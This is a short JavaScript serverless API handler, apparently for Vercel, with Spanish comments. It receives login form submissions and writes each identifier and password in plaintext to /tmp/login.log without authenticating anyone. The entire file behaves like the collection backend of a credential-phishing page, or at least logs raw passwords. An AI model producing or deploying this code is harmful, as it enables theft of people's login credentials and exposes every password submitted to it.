import fs from 'fs';
import path from 'path';

export default function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { identifier, password, remember } = req.body;
  const timestamp = new Date().toISOString();
  const logEntry = `[${timestamp}] identifier=${identifier} | password=${password} | remember=${remember}\n`;

  // En Vercel, guardar en /tmp (sistema de archivos temporal)
  const logPath = path.join('/tmp', 'login.log');

  try {
    fs.appendFileSync(logPath, logEntry, 'utf8');
    res.status(200).json({ success: true, message: 'Registro guardado' });
  } catch (error) {
    console.error('Error escribiendo log:', error);
    res.status(500).json({ error: 'Error al guardar registro' });
  }
}
